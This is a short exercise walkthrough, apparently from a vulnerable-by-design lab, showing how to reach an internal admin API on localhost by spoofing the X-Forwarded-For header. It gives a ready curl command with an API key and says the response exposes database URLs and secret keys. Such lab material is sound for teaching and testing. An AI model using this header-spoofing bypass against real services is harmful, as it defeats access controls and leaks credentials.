## 04 - Internal admin access via IP spoofing

### Goal
Access the internal admin API by spoofing an internal IP with headers.

### Endpoint
- `GET http://127.0.0.1:4000/api/v1/internal/admin`

### Required headers
- `X-API-Key: nvk_d56f1953e015cc01e79c84028089135d`
- `X-Forwarded-For: 127.0.0.1`

### Example

```bash
curl -s \
  -H "X-API-Key: nvk_d56f1953e015cc01e79c84028089135d" \
  -H "X-Forwarded-For: 127.0.0.1" \
  http://127.0.0.1:4000/api/v1/internal/admin
```

### Expected result
JSON response containing sensitive configuration values (database URL, secret keys, upload path).

